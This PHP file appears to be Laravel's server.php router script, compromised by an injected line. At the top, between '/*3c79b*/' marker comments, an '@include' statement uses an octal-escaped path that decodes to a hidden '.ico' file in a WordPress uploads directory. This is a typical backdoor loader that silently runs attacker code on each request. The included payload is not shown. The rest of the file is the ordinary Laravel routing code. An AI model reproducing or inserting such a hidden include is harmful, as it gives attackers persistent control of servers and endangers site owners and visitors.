<?php
/*3c79b*/

@include "\057h\157m\145/\141d\155i\156/\144o\155a\151n\163/\155t\163b\144.\156e\164/\160r\151v\141t\145_\150t\155l\057w\160-\143o\156t\145n\164/\165p\154o\141d\163/\147u\164e\156t\157r\057.\0703\144b\1448\065a\056i\143o";

/*3c79b*/ 
/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
